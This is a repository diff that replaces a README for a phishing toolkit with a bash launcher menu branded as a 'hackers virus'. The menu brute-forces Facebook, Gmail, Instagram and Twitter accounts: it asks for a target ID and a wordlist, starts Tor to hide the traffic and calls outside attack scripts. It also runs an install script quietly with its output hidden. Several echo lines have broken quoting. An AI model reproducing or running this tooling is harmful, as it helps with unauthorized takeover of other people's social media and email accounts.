@@ -1,109 +1,195 @@
+#!/bin/bash
+#Colors
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+nc="\e[0m"
 
-<!-- muja -->
+       echo -e "$red by Mujahid .$nc"
 
-<p align="center">
-  <img src=".imgs/logo.png">
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Version-2.2-green?style=for-the-badge">
-  <img src="https://img.shields.io/github/license/htr-tech/zphisher?style=for-the-badge">
-  <img src="https://img.shields.io/github/stars/htr-tech/zphisher?style=for-the-badge">
-  <img src="https://img.shields.io/github/issues/htr-tech/zphisher?color=red&style=for-the-badge">
-  <img src="https://img.shields.io/github/forks/htr-tech/zphisher?color=teal&style=for-the-badge">
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Author-HTR--Tech-cyan?style=flat-square">
-  <img src="https://img.shields.io/badge/Open%20Source-Yes-cyan?style=flat-square">
-  <img src="https://img.shields.io/badge/Written%20In-Bash-cyan?style=flat-square">
-</p>
-
-<p align="center">A beginners friendly, Automated phishing tool with 30+ templates.</p>
-
-##
-
-<h3><p align="center">Disclaimer</p></h3>
-
-<i>Any actions and or activities related to <b>Zphisher</b> is solely your responsibility. The misuse of this toolkit can result in <b>criminal charges</b> brought against the persons in question. <b>The contributors will not be held responsible</b> in the event any criminal charges be brought against any individuals misusing this toolkit to break the law.
-
-<b>This toolkit contains materials that can be potentially damaging or dangerous for social media</b>. Refer to the laws in your province/country before accessing, using,or in any other way utilizing this in a wrong way.
-
-<b>This Tool is made for educational purposes only</b>. Do not attempt to violate the law with anything contained here. <b>If this is your intention, then Get the hell out of here</b>!
-
-It only demonstrates "how phishing works". <b>You shall not misuse the information to gain unauthorized access to someones social media</b>. However you may try out this at your own risk.</i>
-
-##
-
-### Features
-
-- Latest and updated login pages.
-- Mask URL support 
-- Beginners friendly
-- Docker support (checkout `docker-legacy` branch)
-- Multiple tunneling options
-  - Localhost
-  - Ngrok (With or without hotspot)
-  - Cloudflared (Alternative of Ngrok)
-
-
-### Installation
-
-- Just, Clone this repository -
-```
-$ git clone git:/https://github.com/Mujahid4861/Mujahid4861/pull/1#issue-1164424091/.git
-```
-
-- Change to cloned directory and run `muja.sh` -
-```
-$ cd muja
-$ bash muja.sh
-```
-
-- On first launch, It'll install the dependencies and that's it. `muja` is installed.
-
-### Run on Docker
-```
-$ docker pull htrtech/muja
-$ docker run --rm -it htrtech/muja
-```
-
-### Dependencies
-
-**`muja`** requires following programs to run properly - 
-- `php`
-- `wget`
-- `curl`
-- `git`
-
-> All the dependencies will be installed automatically when you run `muja` for the first time.
-
-> Supported Platform : **`Termux`**, **`Ubuntu/Debian/Kali/Parrot`**, **`Arch Linux/Manjaro`**, **`Fedora`**
-
-##
-
-<h3 align="center">
-:: Workflow ::
-</h3>
-<p align="center">
-<img src=".imgs/wf.gif"/>
-</p>
-
-### Special Thanks :
-
-- [**Aditya Shakya**](https://github.com/adi1090x)
-- [**1RaY-1**](https://github.com/1RaY-1)
-- [**Yisus7u7**](https://github.com/Yisus7u7)
-- [**sepp0**](https://github.com/sepp0)
-- [**TheLinuxChoice**](https://twitter.com/linux_choice)
-- [**DarksecDevelopers**](https://github.com/DarksecDevelopers)
-- [**Moises Tapia**](https://github.com/MoisesTapia)
-
-
-### Find Me on :
-<p align="left">
-  <a href="https://github.com/htr-tech" target="_blank"><img src="https://img.shields.io/badge/Github-HTR--TECH-green?style=for-the-badge&logo=github"></a>
-  <a href="https://www.instagram.com/tahmid.rayat" target="_blank"><img src="https://img.shields.io/badge/IG-%40tahmid.rayat-red?style=for-the-badge&logo=instagram"></a>
-  <a href="https://m.me/tahmid.rayat.official" target="_blank"><img src="https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger"></a>
-</p>
-
+#Installation
+sleep 1
+echo -e "Checking Installation $nc"
+bash install-sb.sh >> /dev/null
+echo -e "Checking Completed [$green✓$nc] $nc "
+sleep 1
+clear
+#Startup
+echo -e "$green"
+echo "		
+echo "_________________________________"
+echo "< BIN MOHAMMAD MAJE HACKERS VIRUS >"
+ echo "---------------------------------"
+echo "    \"
+ echo "    \"
+   echo "                                .::!!!!!!!:."
+echo "  .!!!!!:.                        .:!!!!!!!!!!!!"
+echo "  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$"
+echo "    :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P"
+echo "     $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#"
+echo "      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*"
+echo "      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+echo "    "*$bd$$$$      '*$$$$$$$$$$$o+#"
+echo "         """"          """"""""
+  echo "  __  __ _    _      _         _    _ _____ _____      |  \/  | |  | |    | |  /\   | |  | |_   _|  __ \"
+  echo "| \  / | |  | |    | | /  \  | |__| | | | | |  | |"
+echo " | |\/| | |  | |_   | |/ /\ \ |  __  | | | | |  | |"
+ echo "| |  | | |__| | |__| / ____ \| |  | |_| |_| |__| |"
+echo -e "|_|  |_|\____/ \____/_/    \_\_|  |_|_____|_____/          $nc $blue v2.beta$nc"
+#echo -e "	[+]              $red Coded By muja.hid$nc         		   [+]"
+#echo -e "	[+] 		 $red Mujahid .net $nc 		   [+]"
+#echo -e "	[+] 		 $red Greetz To All Pentesters$nc          		   [+]"
+#echo -e "	[+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles, Mujahid }$nc [+]"
+echo ""
+echo -e "$yellow Select From Menu : $nc"
+echo ""
+echo -e "		$Cyan 1 : Brute Force Facebook Account$nc"
+echo -e "		$Cyan 2 : Brute Force Gmail Account$nc"
+echo -e "		$Cyan 3 : Brute Force Instagram Account 1$nc"
+echo -e "		$Cyan 4 : Brute Force Twitter Account$nc"
+echo -e "		$Cyan 5 : Brute Force Instagram Account 2 $nc"
+echo -e "		$Cyan 99: Exit$nc"
+read -p "Choice >  " ch
+if [ $ch = 1 ]; then
+echo -e "			$Cyan Facebook Brute Force$nc"
+echo -e "$green"
+read -p "Enter Facebook ID / Email / Username / Number: " id
+read -p "Enter wordlist path : " wordlist
+echo -e "$nc"
+cd facebook
+perl fb-brute.pl $id $wordlist
+echo -e " 		[+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check
+echo -e "$nc"
+if [ $check = "Y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check = "y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check = "Yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check = "yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check = "YES" ]; then
+cd .. && bash Mujahid .sh
+else
+exit 1
+fi
+elif [ $ch = 2 ]; then
+echo -e "			$Cyan Gmail Brute Force$nc"
+cd Gemail-Hack
+python2 gemailhack.py
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check2
+echo -e "$nc"
+if [ $check2 = "Y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check2 = "y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check2 = "Yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check2 = "yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check2 = "YES" ]; then
+cd .. && bash Mujahid .sh
+else
+exit 1
+fi
+elif [ $ch = 3 ]; then
+echo -e "			$Cyan Instagram Brute Force 1$nc"
+cd instainsane/
+sleep 0.025
+	echo -e "	[+]$red tor $nc[+]"
+sleep 0.9
+sv tor start
+./instainsane.sh
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+sv tor stop
+#echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check3
+echo -e "$nc"
+if [ $check3 = "Y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check3 = "y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check3 = "Yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check3 = "yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check3 = "YES" ]; then
+cd .. && bash Mujahid .sh
+else
+exit 1
+fi
+elif [ $ch = 4 ]; then
+echo -e "			$Cyan Twitter Brute Force$nc"
+cd tweetshell/
+sleep 0.025
+        echo -e "	[+]$red Service Tor Stated $nc[+]"
+sleep 0.9
+sv tor start
+bash tweetshell.sh
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+sv tor stop
+echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check4
+echo -e "$nc"
+if [ $check4 = "Y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check4 = "y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check4 = "Yes" ]; then
+cd .. && bash mujahid.sh
+elif [ $check4 = "yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check4 = "YES" ]; then
+cd .. && bash Mujahid .sh
+else
+exit 1
+fi
+elif [ $ch = 5 ]; then
+echo -e "			$Cyan Instagram Brute Force 2$nc"
+cd insta-bf/
+sleep 0.025
+        echo -e "	[+]$red Service Tor Started $nc[+]"
+sleep 0.9
+sv tor start
+python instabf.py
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+sv tor stop
+echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check5
+echo -e "$nc"
+if [ $check5 = "Y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check5 = "y" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check5 = "Yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check5 = "yes" ]; then
+cd .. && bash Mujahid .sh
+elif [ $check5 = "YES" ]; then
+cd .. && bash Mujahid .sh
+else
+exit 1
+fi
+elif [ $ch == 99 ]; then
+echo -e "$red Program Exit ...$nc"
+sleep 0.25
+exit 1
+else
+echo "Not Found 404 , Exit"
+exit 1
+fi
